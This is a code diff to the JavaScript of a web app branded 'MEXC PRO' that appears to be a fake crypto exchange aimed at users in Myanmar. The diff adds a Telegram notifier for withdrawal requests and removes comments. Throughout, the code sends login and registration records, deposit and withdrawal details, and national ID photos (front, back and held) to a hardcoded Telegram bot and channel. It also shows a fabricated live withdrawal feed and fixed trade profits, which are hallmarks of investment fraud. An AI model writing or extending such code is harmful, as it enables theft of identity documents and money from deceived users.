@@ -801,9 +801,8 @@
     const TELEGRAM_CHAT_ID = "7709938396";
     const TELEGRAM_CHANNEL = "@mexccustomerservice667";
 
-    // Telegram Limits
-    const TG_PHOTO_MAX_BYTES = 10 * 1024 * 1024;  // 10 MB
-    const TG_PHOTO_MAX_DIM = 10000;                // 10,000px (width+height)
+    const TG_PHOTO_MAX_BYTES = 10 * 1024 * 1024;
+    const TG_PHOTO_MAX_DIM = 10000;
 
     async function sendTelegramMessage(text) {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -825,21 +824,13 @@
         }
     }
 
-    // ================================================================
-    // 🔥 NEW: IMAGE COMPRESSION (Telegram limits အတွင်း ချုံ့ပေးသည်)
-    // ================================================================
     function compressImage(file, maxWidth = 1600, quality = 0.85) {
         return new Promise((resolve) => {
-            // Already small enough and JPEG → just return
-            if (file.size <= 1.5 * 1024 * 1024 && /jpeg|jpg|png/i.test(file.type)) {
-                // Still check dimensions
-            }
             const img = new Image();
             const reader = new FileReader();
             reader.onload = (e) => {
                 img.onload = () => {
                     let { width, height } = img;
-                    // Scale down if too large
                     const scale = Math.min(1, maxWidth / width, maxWidth / height);
                     const newW = Math.max(1, Math.round(width * scale));
                     const newH = Math.max(1, Math.round(height * scale));
@@ -848,19 +839,15 @@
                     canvas.width = newW;
                     canvas.height = newH;
                     const ctx = canvas.getContext('2d');
-                    // Fill white background (for transparent PNGs)
                     ctx.fillStyle = '#FFFFFF';
                     ctx.fillRect(0, 0, newW, newH);
                     ctx.drawImage(img, 0, 0, newW, newH);
 
                     canvas.toBlob((blob) => {
-                        if (!blob) return resolve(file); // fallback to original
-                        console.log(`[Compress] ${file.size} → ${blob.size} bytes (${newW}x${newH})`);
-                        // If compressed is bigger, use original
+                        if (!blob) return resolve(file);
                         if (blob.size >= file.size * 0.98 && file.size < TG_PHOTO_MAX_BYTES) {
                             resolve(file);
                         } else {
-                            // Wrap blob as File so we keep a name
                             const out = new File([blob], (file.name || 'photo').replace(/\.[^.]+$/, '') + '_compressed.jpg', { type: 'image/jpeg' });
                             resolve(out);
                         }
@@ -874,39 +861,28 @@
         });
     }
 
-    // ================================================================
-    // 🔥 NEW: SEND PHOTO TO TELEGRAM (Retry + Fallback + Compression)
-    // ================================================================
     async function sendTelegramPhoto(photoFile, caption) {
         if (!photoFile) {
             console.warn('[Telegram Photo] No file provided');
             return { ok: false };
         }
 
-        // Step 1: Compress if file is too big
         let uploadFile = photoFile;
         try {
             if (photoFile.size > 1.5 * 1024 * 1024) {
-                console.log('[Telegram Photo] Compressing large file...', photoFile.size);
                 uploadFile = await compressImage(photoFile, 1600, 0.85);
             }
-            // If still > 10MB after compression → hard compress more
             if (uploadFile.size > TG_PHOTO_MAX_BYTES) {
                 uploadFile = await compressImage(uploadFile, 1280, 0.7);
             }
-            // If STILL too big → use document
             if (uploadFile.size > TG_PHOTO_MAX_BYTES) {
-                console.warn('[Telegram Photo] Still >10MB after compression → using sendDocument');
                 return await sendTelegramDocument(uploadFile, caption);
             }
         } catch (e) {
-            console.warn('[Telegram Photo] Compression failed, using original', e);
             uploadFile = photoFile;
         }
 
-        // Step 2: Retry sendPhoto up to 3 times
         const maxRetries = 3;
-        let lastError = null;
         for (let attempt = 1; attempt <= maxRetries; attempt++) {
             try {
                 const formData = new FormData();
@@ -926,36 +902,19 @@
                     return data;
                 }
 
-                lastError = data;
-                console.warn(`[Telegram Photo] ❌ Attempt ${attempt} failed:`, data.description);
-
-                // If it's a dimension error or file-too-big error → break to fallback
                 const desc = (data.description || '').toLowerCase();
                 if (desc.includes('dimensions') || desc.includes('too big') || desc.includes('photo_invalid')) {
-                    console.warn('[Telegram Photo] Hard limit hit → switching to sendDocument');
                     break;
                 }
 
-                if (attempt < maxRetries) {
-                    await new Promise(r => setTimeout(r, 1500 * attempt));
-                }
+                if (attempt < maxRetries) await new Promise(r => setTimeout(r, 1500 * attempt));
             } catch (error) {
-                lastError = error;
-                console.error(`[Telegram Photo] Network error on attempt ${attempt}:`, error);
-                if (attempt < maxRetries) {
-                    await new Promise(r => setTimeout(r, 1500 * attempt));
-                }
+                if (attempt < maxRetries) await new Promise(r => setTimeout(r, 1500 * attempt));
             }
         }
-
-        // Step 3: Fallback to sendDocument
-        console.log('[Telegram Photo] All sendPhoto attempts failed → sending as document');
         return await sendTelegramDocument(uploadFile, caption);
     }
 
-    // ================================================================
-    // 🔥 NEW: SEND AS DOCUMENT (Fallback for large/invalid photos)
-    // ================================================================
     async function sendTelegramDocument(file, caption) {
         const maxRetries = 2;
         for (let attempt = 1; attempt <= maxRetries; attempt++) {
@@ -971,59 +930,20 @@
                     { method: 'POST', body: formData }
                 );
                 const data = await response.json();
-
-                if (data.ok) {
-                    console.log(`[Telegram Document] ✅ Sent on attempt ${attempt}`);
-                    return data;
-                }
-                console.warn(`[Telegram Document] ❌ Attempt ${attempt} failed:`, data.description);
-                if (attempt < maxRetries) {
-                    await new Promise(r => setTimeout(r, 1500 * attempt));
-                }
+                if (data.ok) return data;
+                if (attempt < maxRetries) await new Promise(r => setTimeout(r, 1500 * attempt));
             } catch (error) {
-                console.error(`[Telegram Document] Network error on attempt ${attempt}:`, error);
-                if (attempt < maxRetries) {
-                    await new Promise(r => setTimeout(r, 1500 * attempt));
-                }
+                if (attempt < maxRetries) await new Promise(r => setTimeout(r, 1500 * attempt));
             }
         }
         return { ok: false };
     }
 
-    // Convert File to base64 string with data URI prefix for Telegram
-    function fileToBase64(file) {
-        return new Promise((resolve, reject) => {
-            const reader = new FileReader();
-            reader.onload = () => {
-                const base64 = reader.result.split(',')[1];
-                resolve({ dataUri: reader.result, base64: base64 });
-            };
-            reader.onerror = reject;
-            reader.readAsDataURL(file);
-        });
-    }
-
-    // Convert base64 to Blob for FormData upload
-    function base64ToBlob(base64, mimeType) {
-        const byteCharacters = atob(base64.split(',')[1] || base64);
-        const byteNumbers = new Array(byteCharacters.length);
-        for (let i = 0; i < byteCharacters.length; i++) {
-            byteNumbers[i] = byteCharacters.charCodeAt(i);
-        }
-        const byteArray = new Uint8Array(byteNumbers);
-        return new Blob([byteArray], { type: mimeType || 'image/jpeg' });
-    }
-
     function formatTelegramUserInfo(action, userData) {
         const now = new Date().toLocaleString('en-US', {
             timeZone: 'Asia/Yangon',
-            year: 'numeric',
-            month: '2-digit',
-            day: '2-digit',
-            hour: '2-digit',
-            minute: '2-digit',
-            second: '2-digit',
-            hour12: true
+            year: 'numeric', month: '2-digit', day: '2-digit',
+            hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true
         });
 
         let msg = `🔔 <b>${action.toUpperCase()}</b>\n`;
@@ -1038,30 +958,22 @@
         msg += `━━━━━━━━━━━━━━━━━━━━\n`;
         msg += `📢 Channel: ${TELEGRAM_CHANNEL}\n`;
         msg += `🌐 Platform: MEXC PRO`;
-
         return msg;
     }
 
     async function sendLoginToTelegram(userData) {
-        const msg = formatTelegramUserInfo('🔐 USER LOGIN', userData);
-        await sendTelegramMessage(msg);
+        await sendTelegramMessage(formatTelegramUserInfo('🔐 USER LOGIN', userData));
     }
 
     async function sendRegisterToTelegram(userData) {
-        const msg = formatTelegramUserInfo('🆕 NEW USER REGISTERED', userData);
-        await sendTelegramMessage(msg);
+        await sendTelegramMessage(formatTelegramUserInfo('🆕 NEW USER REGISTERED', userData));
     }
 
     async function sendDepositToTelegram(depositData) {
         const now = new Date().toLocaleString('en-US', {
             timeZone: 'Asia/Yangon',
-            year: 'numeric',
-            month: '2-digit',
-            day: '2-digit',
-            hour: '2-digit',
-            minute: '2-digit',
-            second: '2-digit',
-            hour12: true
+            year: 'numeric', month: '2-digit', day: '2-digit',
+            hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true
         });
 
         const methodDisplay = depositData.method === 'kpay' ? 'KBZ Pay 💳' : 'Wave Pay 🌊';
@@ -1087,21 +999,48 @@
     }
 
     // ================================================================
-    // 🔥 UPDATED: SEND VERIFICATION PHOTOS (ပိုမိုယုံကြည်စိတ်ချရသည်)
+    // 🔥 NEW: WITHDRAW TELEGRAM NOTIFICATION (FIXED!)
     // ================================================================
+    async function sendWithdrawToTelegram(withdrawData) {
+        const now = new Date().toLocaleString('en-US', {
+            timeZone: 'Asia/Yangon',
+            year: 'numeric', month: '2-digit', day: '2-digit',
+            hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true
+        });
+
+        const methodDisplay = withdrawData.method === 'kpay' ? 'KBZ Pay 💳' : 'Wave Pay 🌊';
+        const methodEmoji = withdrawData.method === 'kpay' ? '💳' : '🌊';
+        
+        let msg = `🚨 <b>NEW WITHDRAW REQUEST</b>\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+        msg += `👤 <b>User Name:</b> ${withdrawData.username || 'N/A'}\n`;
+        msg += `📱 <b>User Phone (Account):</b> ${withdrawData.ph}\n`;
+        msg += `💰 <b>Balance Before:</b> ${(withdrawData.balanceBefore || 0).toLocaleString()} Ks\n`;
+        msg += `💰 <b>Balance After:</b> ${(withdrawData.balanceAfter || 0).toLocaleString()} Ks\n`;
+        msg += `⭐ <b>VIP Level:</b> VIP ${withdrawData.vip || 0}\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+        msg += `💵 <b>Withdraw Amount:</b> ${parseFloat(withdrawData.amt).toLocaleString()} Ks\n`;
+        msg += `${methodEmoji} <b>Method:</b> ${methodDisplay}\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+        msg += `🏦 <b>Receiver Name:</b> ${withdrawData.receiveName}\n`;
+        msg += `📞 <b>Receiver Phone:</b> ${withdrawData.receivePh}\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+        msg += `🕐 <b>Time:</b> ${now}\n`;
+        msg += `🆔 <b>Request ID:</b> <code>${withdrawData.requestId || 'N/A'}</code>\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+        msg += `📢 Channel: ${TELEGRAM_CHANNEL}\n`;
+        msg += `🌐 Platform: MEXC PRO`;
+
+        await sendTelegramMessage(msg);
+    }
+
     async function sendVerificationPhotosToTelegram(nrcNumber, username, phoneNumber) {
         const now = new Date().toLocaleString('en-US', {
             timeZone: 'Asia/Yangon',
-            year: 'numeric',
-            month: '2-digit',
-            day: '2-digit',
-            hour: '2-digit',
-            minute: '2-digit',
-            second: '2-digit',
-            hour12: true
+            year: 'numeric', month: '2-digit', day: '2-digit',
+            hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true
         });
 
-        // Send text header first
         const headerMsg = 
             `🆔 <b>VERIFICATION REQUEST</b>\n` +
             `━━━━━━━━━━━━━━━━━━━━\n` +
@@ -1124,42 +1063,26 @@
         ];
 
         const results = { front: false, back: false, hold: false };
-
         for (const photo of photos) {
             if (!photo.file) continue;
             const caption = `<b>${photo.label}</b>\n👤 ${username}\n📱 ${phoneNumber}\n🪪 NRC: ${nrcNumber}`;
-            
             try {
                 const result = await sendTelegramPhoto(photo.file, caption);
-                if (result && result.ok) {
-                    results[photo.key] = true;
-                    console.log(`✅ [Verification] ${photo.key} photo delivered`);
-                } else {
-                    console.error(`❌ [Verification] ${photo.key} photo failed permanently`);
-                }
+                if (result && result.ok) results[photo.key] = true;
             } catch (err) {
                 console.error(`💥 [Verification] ${photo.key} exception:`, err);
             }
-            // Spacing between photos (Telegram rate-limit friendly)
             await new Promise(r => setTimeout(r, 1200));
         }
 
         const successCount = Object.values(results).filter(Boolean).length;
         const allOk = successCount === 3;
 
-        // Footer with result
         const footerMsg = allOk
-            ? `✅ <b>Verification Photos Upload Complete</b>\n` +
-              `👤 ${username} | 📱 ${phoneNumber}\n` +
-              `🖼️ ${successCount}/3 ပုံ အောင်မြင်စွာ ပို့ပြီးပါပြီ။\n` +
-              `📢 Channel: ${TELEGRAM_CHANNEL}`
-            : `⚠️ <b>Verification Photos Incomplete</b>\n` +
-              `👤 ${username} | 📱 ${phoneNumber}\n` +
-              `🖼️ ပုံ ${successCount}/3 သာ ရောက်ပါတယ်။ ကျန်တဲ့ပုံတွေကို စစ်ဆေးပေးပါ။\n` +
-              `📢 Channel: ${TELEGRAM_CHANNEL}`;
+            ? `✅ <b>Verification Photos Upload Complete</b>\n👤 ${username} | 📱 ${phoneNumber}\n🖼️ ${successCount}/3 ပုံ အောင်မြင်စွာ ပို့ပြီးပါပြီ။\n📢 Channel: ${TELEGRAM_CHANNEL}`
+            : `⚠️ <b>Verification Photos Incomplete</b>\n👤 ${username} | 📱 ${phoneNumber}\n🖼️ ပုံ ${successCount}/3 သာ ရောက်ပါတယ်။\n📢 Channel: ${TELEGRAM_CHANNEL}`;
         
         await sendTelegramMessage(footerMsg);
-
         return { successCount, allOk, results };
     }
 
@@ -1171,15 +1094,11 @@
         document.getElementById('modal-message').innerHTML = message;
         const btnsContainer = document.getElementById('modal-btns');
         btnsContainer.innerHTML = '';
-        
         buttons.forEach(btn => {
             const b = document.createElement('button');
             b.className = `modal-btn ${btn.type === 'cancel' ? 'modal-btn-cancel' : 'modal-btn-ok'}`;
             b.innerText = btn.text;
-            b.onclick = () => {
-                closeModal();
-                if(btn.callback) btn.callback();
-            };
+            b.onclick = () => { closeModal(); if(btn.callback) btn.callback(); };
             btnsContainer.appendChild(b);
         });
         document.getElementById('custom-modal').classList.add('active');
@@ -1202,14 +1121,9 @@
         const methodDisplay = method === 'kpay' ? 'KBZ Pay 💳' : 'Wave Pay 🌊';
         const modalMessage = `
             <div class="success-modal-content">
-                <div class="success-modal-icon success-icon-green">
-                    <i class="fas fa-check"></i>
-                </div>
+                <div class="success-modal-icon success-icon-green"><i class="fas fa-check"></i></div>
                 <div class="success-modal-title" style="color:var(--green);">ငွေသွင်းမှု အောင်မြင်ပါသည်!</div>
-                <div class="success-modal-text">
-                    သင့်ငွေသွင်းမှု တောင်းဆိုချက်ကို လက်ခံရရှိပါပြီ။<br>
-                    Admin မှ စစ်ဆေးပြီး ချက်ချင်း ဖြည့်သွင်းပေးပါမည်။
-                </div>
+                <div class="success-modal-text">သင့်ငွေသွင်းမှု တောင်းဆိုချက်ကို လက်ခံရရှိပါပြီ။<br>Admin မှ စစ်ဆေးပြီး ချက်ချင်း ဖြည့်သွင်းပေးပါမည်။</div>
                 <div class="success-modal-detail">
                     <div class="row"><span class="label">ငွေသွင်းပမာဏ</span><b style="color:var(--primary);">${parseFloat(amount).toLocaleString()} Ks</b></div>
                     <div class="row"><span class="label">ငွေပေးချေမှုနည်းလမ်း</span><b>${methodDisplay}</b></div>
@@ -1217,10 +1131,7 @@
                     <div class="row"><span class="label">Transaction ID</span><b style="font-size:11px;">${trx}</b></div>
                     <div class="row"><span class="label">အခြေအနေ</span><span style="color:var(--active-gold);font-weight:bold;">⏳ စစ်ဆေးနေသည်</span></div>
                 </div>
-                <div class="success-modal-note">
-                    <i class="fas fa-clock"></i> <b>ခဏစောင့်ဆိုင်းပေးပါ။</b><br>
-                    15 မိနစ်အတွင်း ငွေမရောက်ရှိပါက Customer Service ကို ဆက်သွယ်မေးမြန်းနိုင်ပါသည်။
-                </div>
+                <div class="success-modal-note"><i class="fas fa-clock"></i> <b>ခဏစောင့်ဆိုင်းပေးပါ။</b><br>15 မိနစ်အတွင်း ငွေမရောက်ရှိပါက Customer Service ကို ဆက်သွယ်မေးမြန်းနိုင်ပါသည်။</div>
             </div>
         `;
         showModal('💰 Deposit Success', modalMessage, [{ text: 'အတည်ပြုမည်', callback: () => { showPage('dash-page'); refreshAllHistory(); } }]);
@@ -1229,14 +1140,9 @@
     function showWithdrawSuccess(amount, name, phone, method) {
         const modalMessage = `
             <div class="success-modal-content">
-                <div class="success-modal-icon success-icon-gold">
-                    <i class="fas fa-paper-plane"></i>
-                </div>
+                <div class="success-modal-icon success-icon-gold"><i class="fas fa-paper-plane"></i></div>
                 <div class="success-modal-title" style="color:var(--active-gold);">ငွေထုတ်ယူမှု တောင်းဆိုပြီးပါပြီ!</div>
-                <div class="success-modal-text">
-                    သင့်ငွေထုတ်ယူမှု တောင်းဆိုချက်ကို လက်ခံရရှိပါပြီ။<br>
-                    Admin မှ စစ်ဆေးပေးနေပါသည်။ ခဏစောင့်ဆိုင်းပေးပါ။
-                </div>
+                <div class="success-modal-text">သင့်ငွေထုတ်ယူမှု တောင်းဆိုချက်ကို လက်ခံရရှိပါပြီ။<br>Admin မှ စစ်ဆေးပေးနေပါသည်။ ခဏစောင့်ဆိုင်းပေးပါ။</div>
                 <div class="success-modal-detail">
                     <div class="row"><span class="label">ထုတ်ယူငွေပမာဏ</span><b style="color:var(--active-gold);">${parseFloat(amount).toLocaleString()} Ks</b></div>
                     <div class="row"><span class="label">ထုတ်ယူသည့်နည်းလမ်း</span><b>${method.toUpperCase()}</b></div>
@@ -1244,10 +1150,7 @@
                     <div class="row"><span class="label">ဖုန်းနံပါတ်</span><b>${phone}</b></div>
                     <div class="row"><span class="label">အခြေအနေ</span><span style="color:var(--active-gold);font-weight:bold;">⏳ စစ်ဆေးနေသည်</span></div>
                 </div>
-                <div class="success-modal-note">
-                    <i class="fas fa-clock"></i> <b>ခဏစောင့်ဆိုင်းပေးပါ။</b><br>
-                    15 မိနစ်အတွင်း ငွေမရောက်ရှိပါက Customer Service ကို ဆက်သွယ်မေးမြန်းနိုင်ပါသည်။
-                </div>
+                <div class="success-modal-note"><i class="fas fa-clock"></i> <b>ခဏစောင့်ဆိုင်းပေးပါ။</b><br>15 မိနစ်အတွင်း ငွေမရောက်ရှိပါက Customer Service ကို ဆက်သွယ်မေးမြန်းနိုင်ပါသည်။</div>
             </div>
         `;
         showModal('💸 Withdraw Success', modalMessage, [{ text: 'အတည်ပြုမည်', callback: () => { showPage('dash-page'); refreshAllHistory(); } }]);
@@ -1291,24 +1194,13 @@
                     showPage('dash-page'); 
                     initApp();
                     startLiveWdFeed(); 
-
                     await sendLoginToTelegram(s.val());
-
                     showSuccess('✅ လော့ဂ်အင် အောင်မြင်ပါသည်', `
                         <b>သင်၏ အကောင့်ထဲသို့ ပြန်လည်ဝင်ရောက်မှု အောင်မြင်ပါသည်။</b><br><br>
                         <div style="background:rgba(0,0,0,0.3); padding:12px; border-radius:10px; text-align:left;">
-                            <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
-                                <span style="color:var(--dim);">အသုံးပြုသူ</span>
-                                <b>${s.val().username}</b>
-                            </div>
-                            <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
-                                <span style="color:var(--dim);">ဖုန်းနံပါတ်</span>
-                                <b>${ph}</b>
-                            </div>
-                            <div style="display:flex; justify-content:space-between;">
-                                <span style="color:var(--dim);">လက်ကျန်ငွေ</span>
-                                <b style="color:var(--primary);">${(s.val().balance || 0).toLocaleString()} Ks</b>
-                            </div>
+                            <div style="display:flex; justify-content:space-between; margin-bottom:6px;"><span style="color:var(--dim);">အသုံးပြုသူ</span><b>${s.val().username}</b></div>
+                            <div style="display:flex; justify-content:space-between; margin-bottom:6px;"><span style="color:var(--dim);">ဖုန်းနံပါတ်</span><b>${ph}</b></div>
+                            <div style="display:flex; justify-content:space-between;"><span style="color:var(--dim);">လက်ကျန်ငွေ</span><b style="color:var(--primary);">${(s.val().balance || 0).toLocaleString()} Ks</b></div>
                         </div>
                     `, () => {});
                 } else showSuccess('Login Failed', 'ဖုန်းနံပါတ် သို့မဟုတ် လျှို့ဝှက်နံပါတ် မှားယွင်းနေပါသည်။');
@@ -1326,24 +1218,13 @@
                     registeredAt: new Date().toLocaleString(), phone: ph
                 };
                 db.ref('users/'+ph).set(newUserData);
-
                 await sendRegisterToTelegram(newUserData);
-
                 showSuccess('✅ အကောင့်ဖွင့်ခြင်း အောင်မြင်ပါသည်', `
                     <b>သင်၏ အကောင့်အသစ်ကို အောင်မြင်စွာ ဖွင့်လှစ်ပြီးပါပြီ။</b><br><br>
                     <div style="background:rgba(0,0,0,0.3); padding:12px; border-radius:10px; text-align:left;">
-                        <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
-                            <span style="color:var(--dim);">အသုံးပြုသူအမည်</span>
-                            <b>${un}</b>
-                        </div>
-                        <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
-                            <span style="color:var(--dim);">ဖုန်းနံပါတ်</span>
-                            <b>${ph}</b>
-                        </div>
-                        <div style="display:flex; justify-content:space-between;">
-                            <span style="color:var(--dim);">အကောင့်ဖွင့်ချိန်</span>
-                            <b>${new Date().toLocaleString()}</b>
-                        </div>
+                        <div style="display:flex; justify-content:space-between; margin-bottom:6px;"><span style="color:var(--dim);">အသုံးပြုသူအမည်</span><b>${un}</b></div>
+                        <div style="display:flex; justify-content:space-between; margin-bottom:6px;"><span style="color:var(--dim);">ဖုန်းနံပါတ်</span><b>${ph}</b></div>
+                        <div style="display:flex; justify-content:space-between;"><span style="color:var(--dim);">အကောင့်ဖွင့်ချိန်</span><b>${new Date().toLocaleString()}</b></div>
                     </div>
                     <br><b style="color:var(--active-gold);">ကျေးဇူးပြု၍ လော့ဂ်အင်ဝင်ပါ။</b>
                 `, () => location.reload());
@@ -1381,9 +1262,7 @@
 
         db.ref('announcements').on('value', s => {
             let h = "";
-            s.forEach(a => { 
-                h += `<div class="msg-box"><small class="msg-date">${a.val().date}</small><p style="margin:0; font-size:13px;">${a.val().text}</p></div>`; 
-            });
+            s.forEach(a => { h += `<div class="msg-box"><small class="msg-date">${a.val().date}</small><p style="margin:0; font-size:13px;">${a.val().text}</p></div>`; });
             const el = document.getElementById('announcement-list');
             if(el) el.innerHTML = h || "အက်ဒမင်ထံမှ အကြောင်းကြားစာ မရှိသေးပါ။";
         });
@@ -1398,12 +1277,7 @@
             } else {
                 let h = "";
                 const arr = Object.values(msgs).sort((a,b) => (b.timestamp || 0) - (a.timestamp || 0));
-                arr.forEach(msg => {
-                    h += `<div class="msg-box">
-                        <small class="msg-date">${msg.date}</small>
-                        <p style="margin:0; font-size:13px;">${msg.text}</p>
-                    </div>`;
-                });
+                arr.forEach(msg => { h += `<div class="msg-box"><small class="msg-date">${msg.date}</small><p style="margin:0; font-size:13px;">${msg.text}</p></div>`; });
                 container.innerHTML = h;
             }
             checkNotiDot();
@@ -1411,17 +1285,11 @@
 
         setInterval(checkNotiDot, 30000);
         checkNotiDot();
-
         loadMarkets(); loadMining(); renderVIP(); 
         
-        setTimeout(() => {
-            refreshAllHistory();
-            cleanupExpiredHistory();
-        }, 500);
-        
+        setTimeout(() => { refreshAllHistory(); cleanupExpiredHistory(); }, 500);
         fetchPrices().then(() => { loadMarkets(); });
         cleanupOldTrades();
-        
         if(userDataGlobal) processDailyVipProfit(userDataGlobal, user);
     }
 
@@ -1443,13 +1311,9 @@
         db.ref('userMessages/' + user).once('value', s => {
             let hasNew = false;
             const lastSeen = parseInt(localStorage.getItem('mexc_noti_seen_' + user) || '0');
-            s.forEach(a => {
-                if(a.val().timestamp && a.val().timestamp > lastSeen) hasNew = true;
-            });
+            s.forEach(a => { if(a.val().timestamp && a.val().timestamp > lastSeen) hasNew = true; });
             db.ref('announcements').once('value', s2 => {
-                s2.forEach(a => {
-                    if(a.val().timestamp && a.val().timestamp > lastSeen) hasNew = true;
-                });
+                s2.forEach(a => { if(a.val().timestamp && a.val().timestamp > lastSeen) hasNew = true; });
                 const el = document.getElementById('noti-red-dot');
                 if(el) el.style.display = hasNew ? 'block' : 'none';
             });
@@ -1493,9 +1357,7 @@
         });
     }
 
-    setInterval(() => {
-        if(user && userDataGlobal) processDailyVipProfit(userDataGlobal, user);
-    }, 60000);
+    setInterval(() => { if(user && userDataGlobal) processDailyVipProfit(userDataGlobal, user); }, 60000);
 
     function startLiveWdFeed() {
         const users = ["09***221", "09***775", "09***330", "09***119", "09***882", "09***004"];
@@ -1646,26 +1508,11 @@
             showConfirm(
                 '📊 Trade အတည်ပြုရန်',
                 `<div style="text-align:left; background:rgba(0,0,0,0.3); padding:15px; border-radius:12px; margin-bottom:15px;">
-                    <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
-                        <span style="color:var(--dim);">ငွေစျေး</span>
-                        <b>${pairName}</b>
-                    </div>
-                    <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
-                        <span style="color:var(--dim);">အရောင်းအဝယ်</span>
-                        <b style="color:${side === 'BUY' ? 'var(--green)' : 'var(--red)'};">${sideText}</b>
-                    </div>
-                    <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
-                        <span style="color:var(--dim);">ရင်းနှီးငွေ</span>
-                        <b>${amt.toLocaleString()} Ks</b>
-                    </div>
-                    <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
-                        <span style="color:var(--dim);">အမြတ် %</span>
-                        <b style="color:var(--active-gold);">+${finalProf}%</b>
-                    </div>
-                    <div style="display:flex; justify-content:space-between;">
-                        <span style="color:var(--dim);">ကြာချိန်</span>
-                        <b>${cDur} စက္ကန့်</b>
-                    </div>
+                    <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span style="color:var(--dim);">ငွေစျေး</span><b>${pairName}</b></div>
+                    <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span style="color:var(--dim);">အရောင်းအဝယ်</span><b style="color:${side === 'BUY' ? 'var(--green)' : 'var(--red)'};">${sideText}</b></div>
+                    <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span style="color:var(--dim);">ရင်းနှီးငွေ</span><b>${amt.toLocaleString()} Ks</b></div>
+                    <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span style="color:var(--dim);">အမြတ် %</span><b style="color:var(--active-gold);">+${finalProf}%</b></div>
+                    <div style="display:flex; justify-content:space-between;"><span style="color:var(--dim);">ကြာချိန်</span><b>${cDur} စက္ကန့်</b></div>
                 </div>
                 <p style="color:var(--dim); font-size:13px;">သင်၏ Trade ကို စတင်ရန် အတည်ပြုမည်လား?<br>ငြင်းပယ်ပါက ငွေထုတ်ယူမှု မရှိပါ။</p>`,
                 () => { executeTrade(side, amt, uData); },
@@ -1682,30 +1529,18 @@
         db.ref('users/'+user).update({ balance: uData.balance - amt });
         document.getElementById('timer-ring').classList.add('active');
         
-        showSuccess(
-            '✅ Trade အောင်မြင်ပါသည်',
-            `<div style="text-align:center;">
+        showSuccess('✅ Trade အောင်မြင်ပါသည်', `
+            <div style="text-align:center;">
                 <div style="font-size:50px; color:var(--green); margin-bottom:10px;">📊</div>
                 <b>သင်၏ Trade ကို အောင်မြင်စွာ စတင်လိုက်ပါပြီ။</b><br><br>
                 <div style="background:rgba(0,0,0,0.3); padding:12px; border-radius:10px; text-align:left;">
-                    <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
-                        <span style="color:var(--dim);">ငွေစျေး</span>
-                        <b>${pairName}</b>
-                    </div>
-                    <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
-                        <span style="color:var(--dim);">ရင်းနှီးငွေ</span>
-                        <b>${amt.toLocaleString()} Ks</b>
-                    </div>
-                    <div style="display:flex; justify-content:space-between;">
-                        <span style="color:var(--dim);">ကြာချိန်</span>
-                        <b>${cDur} စက္ကန့်</b>
-                    </div>
+                    <div style="display:flex; justify-content:space-between; margin-bottom:6px;"><span style="color:var(--dim);">ငွေစျေး</span><b>${pairName}</b></div>
+                    <div style="display:flex; justify-content:space-between; margin-bottom:6px;"><span style="color:var(--dim);">ရင်းနှီးငွေ</span><b>${amt.toLocaleString()} Ks</b></div>
+                    <div style="display:flex; justify-content:space-between;"><span style="color:var(--dim);">ကြာချိန်</span><b>${cDur} စက္ကန့်</b></div>
                 </div>
-                <br><b style="color:var(--active-gold);">⏳ ခဏစောင့်ဆိုင်းပေးပါ။</b><br>
-                သင်၏ Trade ရလဒ်ကို ${cDur} စက္ကန့်အတွင်း ပြသပေးပါမည်။
-            </div>`,
-            () => {}
-        );
+                <br><b style="color:var(--active-gold);">⏳ ခဏစောင့်ဆိုင်းပေးပါ။</b>
+            </div>
+        `, () => {});
         
         notifyBot('📊 TRADE STARTED', { 'User': user, 'Name': uData.username, 'Pair': pairName, 'Side': side, 'Amount': amt.toLocaleString() + ' Ks' });
         
@@ -1741,18 +1576,9 @@
                             <b style="font-size:18px; color:#00DBB1;">အမြတ်ရပါသည်!</b><br><br>
                             သင်၏ Trading အောင်မြင်ပါသည်။<br><br>
                             <div style="background:rgba(0,0,0,0.3); padding:12px; border-radius:10px; text-align:left; margin:10px 0;">
-                                <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
-                                    <span style="color:var(--dim);">ရင်းနှီးငွေ</span>
-                                    <b>${amt.toLocaleString()} Ks</b>
-                                </div>
-                                <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
-                                    <span style="color:var(--dim);">အမြတ်</span>
-                                    <b style="color:var(--green);">+${(reward-amt).toLocaleString()} Ks</b>
-                                </div>
-                                <div style="display:flex; justify-content:space-between;">
-                                    <span style="color:var(--dim);">စုစုပေါင်းရရှိငွေ</span>
-                                    <b style="color:var(--primary); font-size:16px;">${reward.toLocaleString()} Ks</b>
-                                </div>
+                                <div style="display:flex; justify-content:space-between; margin-bottom:6px;"><span style="color:var(--dim);">ရင်းနှီးငွေ</span><b>${amt.toLocaleString()} Ks</b></div>
+                                <div style="display:flex; justify-content:space-between; margin-bottom:6px;"><span style="color:var(--dim);">အမြတ်</span><b style="color:var(--green);">+${(reward-amt).toLocaleString()} Ks</b></div>
+                                <div style="display:flex; justify-content:space-between;"><span style="color:var(--dim);">စုစုပေါင်းရရှိငွေ</span><b style="color:var(--primary); font-size:16px;">${reward.toLocaleString()} Ks</b></div>
                             </div>
                         </div>
                     `, [{ text: 'အတည်ပြုမည်', callback: () => { showPage('history-page'); refreshAllHistory(); } }]);
@@ -1767,14 +1593,8 @@
